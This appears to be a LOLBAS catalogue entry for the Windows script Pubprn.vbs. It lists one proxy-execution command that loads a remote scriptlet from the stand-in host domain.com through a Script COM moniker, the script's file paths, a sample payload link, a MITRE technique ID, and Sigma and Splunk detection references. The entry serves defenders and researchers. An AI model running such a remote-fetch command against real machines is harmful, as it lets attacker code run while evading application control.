Name: Pubprn.vbs
Description: Proxy execution with Pubprn.vbs
Author: Oddvar Moe
Created: 2018-05-25
Commands:
- Command: pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct
  Description: Set the 2nd variable with a Script COM moniker to perform Windows Script
    Host (WSH) Injection
  Usecase: Proxy execution
  Category: Execute
  Privileges: User
  MitreID: T1216.001
  OperatingSystem: Windows 10
Full_Path:
- Path: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
- Path: C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs
Code_Sample:
- Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Pubprn_calc.sct
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_rundll32_activity.yml
- Splunk: https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_rundll32_application_control_bypass___syssetup.yml
- Splunk: https://research.splunk.com/endpoint/71b9bf37-cde1-45fb-b899-1b0aa6fa1183/
Resources:
- Link: https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/
- Link: https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
- Link: https://github.com/enigma0x3/windows-operating-system-archaeology
Acknowledgement:
- Person: Matt Nelson
  Handle: '@enigma0x3'
